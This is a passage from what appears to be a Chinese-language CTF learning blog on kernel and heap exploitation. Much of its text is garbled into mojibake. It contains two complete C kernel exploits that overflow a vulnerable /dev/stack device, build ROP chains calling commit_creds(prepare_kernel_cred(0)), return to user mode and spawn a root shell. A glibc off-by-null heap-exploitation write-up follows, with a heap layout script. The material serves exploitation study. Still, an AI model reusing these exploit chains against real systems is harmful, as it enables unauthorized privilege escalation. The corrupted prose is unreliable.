long)memOffset-0xF8F3AA;\n    unsigned long prepare_kernel_cred_k = (unsigned long)memOffset-0xFBF2E0;\n    unsigned long commit_creds_k = (unsigned long)memOffset-0xFBF6A0;\n    unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;\n    unsigned long iretq = (unsigned long)memOffset-0x7AC289;\n    unsigned long sh = (unsigned long)shell;\n\n\n\n\n    printf(\"    addr[0x%llx]\\n\", memOffset);\n\n    /* open fd on /dev/vuln \t\t\t\t\t\t\t*/\n    printf(\"[+] Open vuln device...\\n\");\n    if ((fd = open(\"/dev/stack\", O_RDWR)) < 0) {\n        printf(\"    Can't open device file: /dev/stack\\n\");\n        exit(1);\n    }\n\n\n    /* payload                          */\n    printf(\"[+] Construct the payload...\\n\");\n    save_state();\n    /* offset before RIP                    */\n    memcpy(p,\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\",116);\n    p+=116;\n\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* for rbp */\n    p+=8;\n\n\n    /*\npop rdi;ret  \tffffffff8131750d\n0\nprepare_kernel_cred_k_addr   \npop rdx;rbx;rbp;ret  0xffffffff8137ac33\ncommit_creds_k_addr\nmov rdi,rax;call rdx \t0xffffffff8109fc56\nswags;\t....\npop rbp;ret; 0xffffffff8137ac35\n0xdeadbeef\niretq; ....\nshell;\nCS\nEFLAGS\nRSP\nSS\n*/\n\n\n    /* pop rdi;ret                    */\n    printf(\"    pop rdi      at 0x%lx\\n\", pop_rdi_ret);\n    memcpy(p,&pop_rdi_ret,8);\n    p+=8;\n    memcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* rbx*/\n    p+=8;\n\n    //prepare_kernel_cred_k\n    printf(\"    prepare_kernel_cred_k_addr at 0x%lx\\n\", prepare_kernel_cred_k);\n    memcpy(p,&prepare_kernel_cred_k,8); \n    p+=8;\n\n    //pop rdx;rbx;rbp;ret\n    printf(\"    pop_rdx_rbx_rbp_ret at 0x%lx\\n\", pop_rdx_rbx_rbp_ret);\n    memcpy(p,&pop_rdx_rbx_rbp_ret,8); \n    p+=8;\n\n\n    //pop rbp;ret\n    printf(\"    pop_rbp_ret at 0x%lx\\n\", pop_rbp_ret);\n    memcpy(p,&pop_rbp_ret,8);\n    p+=8;\n    memcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8); //rbx\n    p+=8;\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8); //rbp\n    p+=8;\n\n\n\n    //mov rdi,rax;call rdx\n    printf(\"    mov rdi,rax;call_rdx at 0x%lx\\n\", movRdiRax_call_rdx);\n    memcpy(p,&movRdiRax_call_rdx,8); \n    p+=8;\n\n    //commit_creds_k\n    printf(\"    commit_creds_k at 0x%lx\\n\", commit_creds_k);\n    memcpy(p,&commit_creds_k,8); \n    p+=8;\n\n    /* swapgs;ret           */\n    printf(\"    swapgs       at 0x%lx\\n\", swapgs);\n    memcpy(p,&swapgs,8);\n    p+=8;\n\n    /* iretq                          */\n    printf(\"    iretq        at 0x%lx\\n\", iretq);\n    memcpy(p,&iretq,8);\n    p+=8;\n\n\n    /*\n\tthe stack should look like this after an iretq call\n\t  RIP\n\t  CS\n\t  EFLAGS\n\t  RSP\n\t  SS\n\t*/\n\n\n    /* shell                          */\n    memcpy(p,&sh,8);\n    p+=8;\n\n    /* user_cs                        */\n    memcpy(p,&user_cs,8);\n    p+=8;\n    /* user_rflags                    */\n    memcpy(p,&user_rflags,8);\n    p+=8;\n    /*stack of userspace   \t\t\t  */         \n    register unsigned long rsp asm(\"rsp\");\n    unsigned long sp = (unsigned long)rsp;\n    memcpy(p,&sp,8);\n    p+=8;\n    /* user_ss                        */\n    memcpy(p,&user_ss,8);\n\n    /* trig the vuln                  */\n    printf(\"[+] Trig the vulnerablity...\\n\");\n    write(fd, payload, 300);\n\n\n    return 0;\n\n}\n\n\n\n\n\nunsigned long findAddr() {\n    char line[512];\n    char string[] = \"Freeing SMP alternatives memory\";\n    char found[17];\n    unsigned long addr=0;\n\n    /* execute dmesg and place result in a file */\n    printf(\"[+] Excecute dmesg...\\n\");\n    system(\"dmesg > /tmp/dmesg\");\n\n    /* find: Freeing SMP alternatives memory    */\n    printf(\"[+] Find usefull addr...\\n\");\n\n    FILE* file = fopen(\"/tmp/dmesg\", \"r\");\n\n\n    while (fgets(line, sizeof(line), file)) {\n        if(strstr(line,string)) {\n            strncpy(found,line+53,16);\n            sscanf(found,\"%p\",(void **)&addr);\n            break;\n        }\n    }\n    fclose(file);\n\n    if(addr==0) {\n        printf(\"    dmesg error...\\n\");\n        exit(1);\n    }\n\n    return addr;\n}\n\nstatic void save_state() {\n    asm(\n        \"movq %%cs, %0\\n\"\n        \"movq %%ss, %1\\n\"\n        \"pushfq\\n\"\n        \"popq %2\\n\"\n        : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\"     );\n}\n\nvoid shell(void) {\n    printf(\"[+] getuid() ...\");\n    if(!getuid()) {\n        printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n        system(\"/bin/sh\");\n    } else {\n        printf(\"[+] not root\\n[+] failed !!!\\n\");\n    }\n}\n```\n\n[(15æ¡æ¶ˆæ¯) linux kernel pwnå­¦ä¹ ä¹‹ROP_seaaseesaçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/seaaseesa/article/details/104575654?ops_request_misc=%7B%22request%5Fid%22%3A%22163298340616780366585344%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=163298340616780366585344&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-104575654.pc_v2_rank_blog_default&utm_term=kernel&spm=1018.2226.3001.4450)\n\n\n\n# äºŒã€Stackæœªè¢«ä¿æŠ¤\n\n## è§£æ\n\nè¿™ä¸ªç›´æ¥è°ƒç”¨ç”¨æˆ·ç©ºé—´æ„é€ çš„`commit_creds(prepare_kernel_cred(0))`ææƒï¼Œç„¶åç›´æ¥åŸåœ°èµ·shellå³å¯ã€‚ç›¸å½“äºçœå»å…³é—­smepä¿æŠ¤çš„é‚£æ®µROPé“¾ï¼Œç›´æ¥getrootå³å¯ã€‚\n\n## poc\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n\nstruct cred;\nstruct task_struct;\ntypedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));\ntypedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));\nprepare_kernel_cred_t   prepare_kernel_cred;\ncommit_creds_t    commit_creds;\n\nunsigned long user_cs;\nunsigned long user_ss;\nunsigned long user_rflags;\nunsigned long stack;\n\n\nunsigned long findAddr();\nstatic void save_state();\nvoid getroot (void);\nvoid shell(void);\n\n\nint main(int argc, char *argv[])\n{\n    int fd;\n    unsigned char payload[300] = {0};\n    unsigned char *p           = payload;\n    unsigned long memOffset;\n\n\n\n    memOffset = findAddr();\n    unsigned long pop_rax_rbx_r12_rbp_ret = memOffset - 0xCB5B47;\n    unsigned long movCr4Rax_pop_rbp = (unsigned long)memOffset-0x01020F1C;\n    unsigned long getR = (unsigned long)getroot;\n    unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;\n    unsigned long iretq = (unsigned long)memOffset-0x7AC289;\n    unsigned long sh = (unsigned long)shell;\n\n\n\n\n    printf(\"    addr[0x%llx]\\n\", memOffset);\n\n    /* set value for commit_creds and prepare_kernel_cred */\n    commit_creds        = (commit_creds_t)(memOffset - 0xfbf6a0);\n    prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xfbf2e0);\n\n\n    /* open fd on /dev/vuln \t\t\t\t\t\t\t*/\n    printf(\"[+] Open vuln device...\\n\");\n    if ((fd = open(\"/dev/stack\", O_RDWR)) < 0) {\n        printf(\"    Can't open device file: /dev/stack\\n\");\n        exit(1);\n    }\n\n\n    /* payload                          */\n    printf(\"[+] Construct the payload...\\n\");\n    save_state();\n    /* offset before RIP                    */\n    memcpy(p,\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\",116);\n    p+=116;\n\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* for rbp */\n    p+=8;\n\n\n    /* getroot                        */\n    memcpy(p,&getR,8);\n    p+=8;\n\n    /* swapgs;ret           */\n    printf(\"    swapgs       at 0x%lx\\n\", swapgs);\n    memcpy(p,&swapgs,8);\n    p+=8;\n\n    /* iretq                          */\n    printf(\"    iretq        at 0x%lx\\n\", iretq);\n    memcpy(p,&iretq,8);\n    p+=8;\n\n\n    /*\n\tthe stack should look like this after an iretq call\n\t  RIP\n\t  CS\n\t  EFLAGS\n\t  RSP\n\t  SS\n\t*/\n\n\n    /* shell                          */\n    memcpy(p,&sh,8);\n    p+=8;\n\n\n\n    /* user_cs                        */\n    memcpy(p,&user_cs,8);\n    p+=8;\n    /* user_rflags                    */\n    memcpy(p,&user_rflags,8);\n    p+=8;\n    /*stack of userspace   \t\t\t  */         \n    register unsigned long rsp asm(\"rsp\");\n    unsigned long sp = (unsigned long)rsp;\n    memcpy(p,&sp,8);\n    p+=8;\n    /* user_ss                        */\n    memcpy(p,&user_ss,8);\n\n    /* trig the vuln                  */\n    printf(\"[+] Trig the vulnerablity...\\n\");\n    write(fd, payload, 300);\n\n\n    return 0;\n\n}\n\n\n\n\n\nunsigned long findAddr() {\n    char line[512];\n    char string[] = \"Freeing SMP alternatives memory\";\n    char found[17];\n    unsigned long addr=0;\n\n    /* execute dmesg and place result in a file */\n    printf(\"[+] Excecute dmesg...\\n\");\n    system(\"dmesg > /tmp/dmesg\");\n\n    /* find: Freeing SMP alternatives memory    */\n    printf(\"[+] Find usefull addr...\\n\");\n\n    FILE* file = fopen(\"/tmp/dmesg\", \"r\");\n\n\n    while (fgets(line, sizeof(line), file)) {\n        if(strstr(line,string)) {\n            strncpy(found,line+53,16);\n            sscanf(found,\"%p\",(void **)&addr);\n            break;\n        }\n    }\n    fclose(file);\n\n    if(addr==0) {\n        printf(\"    dmesg error...\\n\");\n        exit(1);\n    }\n\n    return addr;\n}\n\nstatic void save_state() {\n    asm(\n        \"movq %%cs, %0\\n\"\n        \"movq %%ss, %1\\n\"\n        \"pushfq\\n\"\n        \"popq %2\\n\"\n        : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\"     );\n}\n\nvoid shell(void) {\n    printf(\"[+] getuid() ...\");\n    if(!getuid()) {\n        printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n        system(\"/bin/sh\");\n    } else {\n        printf(\"[+] not root\\n[+] failed !!!\\n\");\n    }\n}\n\n/* function to get root id */\nvoid getroot (void)\n{\n    commit_creds(prepare_kernel_cred(0));\n}\n\n\n\n\n```\n\nâ–²è¿™é‡Œå¦‚æœåŠ äº†SMEPä¿æŠ¤ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°ä¸‹åˆ—çš„é”™è¯¯\n\n```\nunable to execute userspace code (SMEP?) (uid: 1000)\n```\n\n![image-20211004100138854](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211004100145.png)\n\n","tags":["pwnKernel"],"categories":["pwnKernel"]},{"title":"off-by-nullæ€»ç»“","url":"/2021/08/31/off-by-nullæ€»ç»“/","content":"\n\n\n# å‰è¨€\n\noff-by-nullæ˜¯å †ä¸­çš„å¸¸è§æ¼æ´ï¼Œå¾ˆå¤šæ—¶å€™éƒ½æ˜¯ç»“åˆå †å¸ƒå±€æ¥è¿›è¡Œåˆ©ç”¨çš„ã€‚è¿™é‡Œç»“åˆåŸç†è§£æã€ä¸åŒç‰ˆæœ¬å’Œæ¡ä»¶çš„off-by-nullä»¥åŠå¸¸è§çš„æ¼æ´æ¡ä»¶åšä¸ªæ€»ç»“ã€‚\n\n# ä¸€ã€åŸç†è§£æ\n\nä¸»è¦å‘ç”Ÿåœ¨`_int_free`çš„unlinkä¸­ï¼š\n\n```c\n//2.23 when size>global_max_fast\n\n/* consolidate backward */\nif (!prev_inuse(p)) {\n    prevsize = p->prev_size;\n    size += prevsize;\n    p = chunk_at_offset(p, -((long) prevsize));\n    unlink(av, p, bck, fwd);\n}\n\n\nif (nextchunk != av->top) {\n    /* get and clear inuse bit */\n    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n\n    /* consolidate forward */\n    if (!nextinuse) {\n        unlink(av, nextchunk, bck, fwd);\n        size += nextsize;\n    }\n    \n\n    \n/* Take a chunk off a bin list */\n#define unlink(AV, P, BK, FD) {                                             \n    FD = P->fd;\t\t\t\t\t\t\t\t       \n    BK = P->bk;\t\t\t\t\t\t\t\t       \n    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))\t\t       \n        malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);   \n    else {\t\t\t\t\t\t\t\t       \n        FD->bk = BK;\t\t\t\t\t\t\t       \n        BK->fd = FD;\t\t\t\t\t\t\t       \n        if (!in_smallbin_range (P->size)\t\t\t\t       \n            && __builtin_expect (P->fd_nextsize != NULL, 0)) \n        {\t\t       \n            if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)\t       \n                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))     \n                malloc_printerr (check_action,\t\t\t\t       \n                                 \"corrupted double-linked list (not small)\",     \n                                 P, AV);\t\t\t\t\t       \n            if (FD->fd_nextsize == NULL) {\t\t\t\t       \n                if (P->fd_nextsize == P)\t\t\t\t       \n                    FD->fd_nextsize = FD->bk_nextsize = FD;\t\t       \n                else {\t\t\t\t\t\t\t       \n                    FD->fd_nextsize = P->fd_nextsize;\t\t\t       \n                    FD->bk_nextsize = P->bk_nextsize;\t\t\t       \n                    P->fd_nextsize->bk_nextsize = FD;\t\t\t       \n                    P->bk_nextsize->fd_nextsize = FD;\t\t\t       \n                }\t\t\t\t\t\t\t       \n            } else {\t\t\t\t\t\t\t       \n                P->fd_nextsize->bk_nextsize = P->bk_nextsize;\t\t       \n                P->bk_nextsize->fd_nextsize = P->fd_nextsize;\t\t       \n            }\t\t\t\t\t\t\t\t       \n        }\t\t\t\t\t\t\t\t       \n    }\n}    \n```\n\nä¸ºäº†æ–¹ä¾¿ï¼Œä¾æ®ç‰©ç†åœ°å€ç›¸é‚»æ¥å‘½åå¦‚ä¸‹ï¼š\n\n![Snipaste_2021-08-31_11-47-47](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831114803.png)\n\nå³å½“sizeå¤§äºglobal_max_fastä¸”ä¸æ˜¯mmapå‡ºæ¥çš„chunkæ—¶ï¼Œå°±ä¼šè¿›å…¥åˆ¤æ–­ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¿›è¡Œé‡Šæ”¾ç”¨çš„chunkçš„å¤§å°å°±å¿…é¡»è¦å¤§äºglobal_max_fastæ‰è¡Œï¼Œå¦åˆ™å°±æ˜¯æ”¹æ‰äº†pre_inuseä½ä¹Ÿæ˜¯ç›´æ¥è¿›å…¥fastbinï¼Œä¸ä¼šè¿›å…¥åˆ¤æ–­çš„ã€‚\n\n+ å…ˆä¾æ®å½“å‰chunk(chunkP)çš„pre_inuseä½æ¥åˆ¤æ–­å‰ä¸€ä¸ªchunk(preChunk)æ˜¯å¦å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œæ˜¯åˆ™è¿›å…¥unlinkï¼Œå°†å‰ä¸€ä¸ªchunkå–å‡º\n\n+ ç„¶ååˆ¤æ–­ä¸‹ä¸€ä¸ªchunk(nextChunk)æ˜¯å¦æ˜¯top_chunkï¼Œæ˜¯åˆ™ç›´æ¥ä¸top_chunkåˆå¹¶ã€‚\n+ è‹¥nextChunkä¸ä¸ºtop_chunkï¼Œå†åˆ¤æ–­ä¸‹ä¸€ä¸ªChunkçš„å†ä¸‹ä¸€ä¸ªchunkçš„pre_inuseä½æ¥åˆ¤æ–­nextChunkæ˜¯å¦å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œè‹¥æ˜¯åˆ™è¿›å…¥unlinkã€‚\n\nç„¶åunlinkä¸­å°±ä¸ç»†è¯´ï¼Œå°±æ˜¯åŒå‘å¾ªç¯é“¾è¡¨è§£é“¾çš„è¿‡ç¨‹ï¼Œä¾æ®fdå’Œbkæ¥æŸ¥æ‰¾å¹¶è§£é“¾ï¼Œä½†æ˜¯æˆ‘ä»¬çš„off-by-nullé€šå¸¸ä¸ä¼šæ¶‰åŠåˆ°nextsizeä½çš„ä½¿ç”¨ï¼Œæ‰€ä»¥åŸºæœ¬ä¸ç”¨çœ‹åé¢çš„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¿™é‡Œä¼šæ£€æŸ¥ï¼Œå³ï¼š\n\n    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))\t\t       \n        malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n\næ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†è¿›å…¥unlinkçš„chunkçš„fdå’Œbkæ¥è¿›è¡Œä¼ªé€ æˆ–è€…å¹²è„†ç›´æ¥é‡Šæ”¾ä½¿å…¶ç›´æ¥è¿›å…¥unsortedbinä¸­å®ŒæˆåŒå‘é“¾è¡¨çš„åŠ æŒã€‚è¿™é‡Œå…ˆè®²æ”¾å…¥unsortedbinä¸­æ¥è·å–fdå’Œbkçš„æ–¹æ³•ï¼Œä¼ªé€ çš„æ–¹æ³•ä¸€èˆ¬ç”¨åœ¨2.29åŠä»¥ä¸Šçš„é«˜ç‰ˆæœ¬ä¸­ï¼Œå› ä¸ºé‚£æ—¶å€™çš„unlinkåŠ å…¥äº†å…³äºsizeä½çš„æ£€æŸ¥ï¼Œä¸èƒ½ç®€å•å¾—ä¼ªé€ fdå’Œbkã€‚\n\nå…¶æ¬¡ï¼Œè¿™é‡Œè¿˜éœ€è¦æ˜ç™½ä¸€ä¸ªå¯»æ‰¾chunkçš„åŸç†ã€‚\n\n+ å¯»æ‰¾preChunkï¼špreChunk_addr = chunkP_addr - chunkP->pre_size\n+ å¯»æ‰¾nextChunkï¼šnextChunk_addr = chunkP_addr + chunkP->size\n\nå³ä»¥ä¸‹æºç ï¼Œè¿™ä¸ªä¸€ç›´æ²¡æœ‰å˜åŒ–è¿‡ï¼š\n\n```c\n/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */\n#define prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))\n\n/* Ptr to next physical malloc_chunk. */\n#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))\n\n/* Get size, ignoring use bits */\n#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))\n\n/* extract p's inuse bit */\n#define inuse(p)\t\t\t\t\t\t\t      \\\n  ((((mchunkptr) (((char *) (p)) + chunksize (p)))->mchunk_size) & PREV_INUSE)\n```\n\næ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä¼ªé€ pre_sizeå’Œin_useä½ï¼Œå°±èƒ½è§¦å‘å‘ä¸Šä»»æ„å¯»æ‰¾ä¸€ä¸ªæ»¡è¶³fdå’Œbkä¸ºåŒå‘é“¾è¡¨çš„chunkï¼Œä»è€Œå°†ä¸­é—´æ‰€æœ‰çš„chunkéƒ½ä¸€å¹¶åˆå¹¶ä¸ºä¸€ä¸ªChunké‡Šæ”¾æ‰ã€‚(å‘ä¸‹åˆå¹¶ä¹Ÿå¯ä»¥çš„ï¼Œä¸è¿‡ä¸€èˆ¬ä¸å¸¸ä½¿ç”¨)\n\n![Snipaste_2021-08-31_11-57-00](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831115708.png)\n\nè¿™é‡Œå°±æ˜¯é€šè¿‡é‡Šæ”¾chunkPï¼Œä¾æ®pre_sizeå‘ä¸Šå¯»æ‰¾åˆ°åŸæœ¬å·²ç»åœ¨unsortedbinä¸­çš„preChunkï¼Œå…¶FDå’ŒBKå·²ç»ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå¯ä»¥ç»•è¿‡æ£€æŸ¥ï¼Œæ‰€ä»¥é‡Šæ”¾ChunkPä¹‹åpreChunk+OverlapChunk+chunkPéƒ½è¿›å…¥åˆ°unsortedbinä¸­ã€‚ä½†æ˜¯OverlapChunkæœ¬èº«å…¶å®å¹¶æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œæˆ‘ä»¬å†ä»unsortedbinä¸­ç”³è¯·åˆ‡å‰²å‡ºpreChunkå¤§å°çš„chunkï¼Œå†ç”³è¯·å°±å¯ä»¥å¾—åˆ°OverlapChunkã€‚è¿™æ ·æˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆéƒ½æŒ‡å‘OverlapChunkï¼Œä»è€Œä¼ªé€ å‡ºUAFï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡OverlapChunkæ¥getshelläº†ã€‚\n\n## 1.å¸¸ç”¨å¸ƒå±€\n\n```python\nadd_malloc(0xf8,'\\x00'*0xf8)\t#0x1\nadd_malloc(0x68,'\\x00'*0x68)\t#0x2\nadd_malloc(0xf8,'\\x00'*0xf8)\t#0x3\nadd_malloc(0x68,'\\x00'*0x68)\t#0x4\nfree(0x1)\nedit(0x2,0x70,'\\x00'*0x60+p64(0x70+0x100)+p16(0x100))\nfree(0x3)\n```\n\noff-by-nullåœ¨è°ƒè¯•ä¸­ä¸å¤ªå¥½æï¼Œæ‰€ä»¥æˆ‘å°±å€Ÿç”¨å †æº¢å‡ºæ¥å‡è®¾å­˜åœ¨off-by-nullï¼Œå°†chunk3åŸæœ¬çš„sizeä½0x101é€šè¿‡off-by-nullå˜æˆ0x100å³å¯ã€‚\n\n\n\n## 2.æ³¨æ„äº‹é¡¹\n\n### (1)é¡ºåº\n\næ­¤å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œéœ€è¦å…ˆé‡Šæ”¾chunk1ï¼Œå†æº¢å‡ºä¿®æ”¹chunk3ã€‚ä¸ç„¶å¦‚æœå…ˆä¿®æ”¹chunk3ï¼Œé‚£ä¹ˆé‡Šæ”¾chunk1çš„æ—¶å€™ï¼Œå¯»æ‰¾chunk1çš„nextChunkå³chunk2ï¼Œåˆ¤æ–­chunk2æ˜¯å¦å¤„äºé‡Šæ”¾çŠ¶æ€æ—¶ï¼Œä¼šæ‰¾åˆ°chunk3ï¼Œä¾æ®pre_inuseä½å‘ç°chunk2å·²ç»å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œé‚£ä¹ˆå°è¯•è¿›å…¥unlinkåˆå¹¶ï¼Œä½†æ˜¯è¿™é‡Œçš„chunk2çš„fdå’Œbkå¹¶æ²¡æœ‰ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ‰€ä»¥ä¼šå‡ºé”™ã€‚\n\n### (2)sizeä½çš„è®¾ç½®\n\n+ 0x100ï¼šè¿™é‡Œæ³¨æ„åˆ°ä¸Šé¢çš„å¸ƒå±€ä¸­sizeä½ä¸º0x100å’Œ0x70ï¼Œè¿™é‡Œçš„0x100å°±æ˜¯ä¸ºäº†é€šè¿‡off-by-nullå°†0x101å˜æˆ0x100è®¾ç½®çš„ã€‚å½“ç„¶è®¾ç½®ä¸º0x201ï¼Œ0x301é€šå¸¸ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚\n\n+ 0x70ï¼šè¿™é‡Œå°±é€šå¸¸æ˜¯ä¸ºäº†æ–¹ä¾¿æ‰“fastbin attackï¼Œä»_malloc_hookå¤„æ„é€ 0x7få­—èŠ‚é”™ä½ç”¨çš„ã€‚\n\n\n\n# äºŒã€æ›´æ–°æ¢ä»£\n\n## 1.Glibc2.27\n\nè¿™é‡Œä¹Ÿä¸æ˜¯ç‰¹æŒ‡2.27ï¼Œè€ŒæŒ‡çš„æ˜¯Glibc2.29ä»¥ä¸‹çš„å­˜åœ¨tcacheçš„ç‰ˆæœ¬ï¼Œè¿™ç±»ç‰ˆæœ¬é€šå¸¸éœ€è¦å¡«å……æ»¡tcacheå†è¿›è¡Œé‡Šæ”¾ï¼Œä¹Ÿä¸éœ€è¦å¤šè®²ã€‚\n\n## 2.Glibc2.29\n\nä»è¿™ä¸ªç‰ˆæœ¬å¼€å§‹ï¼Œoff-by-nullç”±äºåŠ å…¥çš„æ£€æŸ¥ï¼Œå¼•å…¥äº†å¥½å‡ ç§å…¨æ–°çš„åˆ©ç”¨æ–¹å¼ã€‚\n\n### (1)_int_freeä¸­çš„å˜åŒ–\n\n```c\nif (!prev_inuse(p)) {\n    prevsize = prev_size (p);\n    size += prevsize;\n    p = chunk_at_offset(p, -((long) prevsize));\n    if (__glibc_unlikely (chunksize(p) != prevsize))\n        malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n    unlink_chunk (av, p);\n}\n```\n\nåŠ å…¥çš„æ£€æŸ¥æ˜¯\n\n```c\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\nè¿™é‡Œçš„på› ä¸º`p = chunk_at_offset(p, -((long) prevsize));`å·²ç»å˜æˆäº†preChunkã€‚æ‰€ä»¥è¿™é‡Œå°±æ˜¯æ£€æŸ¥preChunk->sizeæ˜¯å¦ç­‰äºchunkP->pre_sizeã€‚æŒ‰ç…§ä¸Šé¢é‚£å¼ å›¾çš„é€»è¾‘ï¼ŒpreChunkçš„sizeä¸º0x101ï¼ŒchunkPçš„pre_sizeä¸º0x170ï¼Œä¸¤ä¸ªä¸ç­‰äºï¼Œæ ¹æœ¬å°±æ— æ³•è¿›å…¥unlinkä¸­ï¼Œç›´æ¥å´©æ‰ã€‚\n\n![Snipaste_2021-08-31_11-57-00](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831123554.png)\n\n### (2)unlinkå˜åŒ–\n\né¦–å…ˆunlinkä»å®å®šä¹‰å˜æˆäº†å…¨å±€å‡½æ•°å®šä¹‰ï¼Œåå­—ä¹Ÿä»unlinkå˜æˆäº†unlink_chunkï¼Œä½†å®é™…å†…å®¹æ²¡æœ‰å˜å¤ªå¤šï¼Œåªæ˜¯åŠ å…¥äº†ä¸€äº›æ£€æŸ¥ï¼š\n\n```c\n/* Take a chunk off a bin list.  */\nstatic void\n    unlink_chunk (mstate av, mchunkptr p)\n{\n    if (chunksize (p) != prev_size (next_chunk (p)))\n        malloc_printerr (\"corrupted size vs. prev_size\");\n\n    mchunkptr fd = p->fd;\n    mchunkptr bk = p->bk;\n\n    if (__builtin_expect (fd->bk != p || bk->fd != p, 0))\n        malloc_printerr (\"corrupted double-linked list\");\n\n    fd->bk = bk;\n    bk->fd = fd;\n    if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)\n    {\n        if (p->fd_nextsize->bk_nextsize != p\n            || p->bk_nextsize->fd_nextsize != p)\n            malloc_printerr (\"corrupted double-linked list (not small)\");\n\n        if (fd->fd_nextsize == NULL)\n        {\n            if (p->fd_nextsize == p)\n                fd->fd_nextsize = fd->bk_nextsize = fd;\n            else\n            {\n                fd->fd_nextsize = p->fd_nextsize;\n                fd->bk_nextsize = p->bk_nextsize;\n                p->fd_nextsize->bk_nextsize = fd;\n                p->bk_nextsize->fd_nextsize = fd;\n            }\n        }\n        else\n        {\n            p->fd_nextsize->bk_nextsize = p->bk_nextsize;\n            p->bk_nextsize->fd_nextsize = p->fd_nextsize;\n        }\n    }\n\n}\n```\n\nåŠ å…¥çš„æ£€æŸ¥ï¼Œå°±åŠ äº†ä¸€ä¸ªifè¯­å¥ï¼š\n\n```c\n  if (chunksize (p) != prev_size (next_chunk (p)))\n    malloc_printerr (\"corrupted size vs. prev_size\");\n```\n\nå³åœ¨unlinkæ—¶ä¼šæ£€æŸ¥nextChunkçš„pre_sizeæ˜¯å¦ç­‰äºchunkPçš„sizeã€‚\n\næŒ‰ç…§ä¹‹å‰é‚£å¼ 